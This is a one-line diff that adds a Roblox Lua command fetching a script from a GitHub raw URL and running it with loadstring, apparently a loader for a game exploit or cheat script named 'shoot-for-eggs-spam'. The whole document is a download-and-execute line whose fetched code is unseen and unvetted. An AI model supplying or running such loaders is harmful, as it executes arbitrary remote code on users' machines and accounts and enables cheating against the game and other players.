@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LeopardEquip39/loaders/main/loaders/shoot-for-eggs-spam3-xwxacwochhwq8b.lua"))()
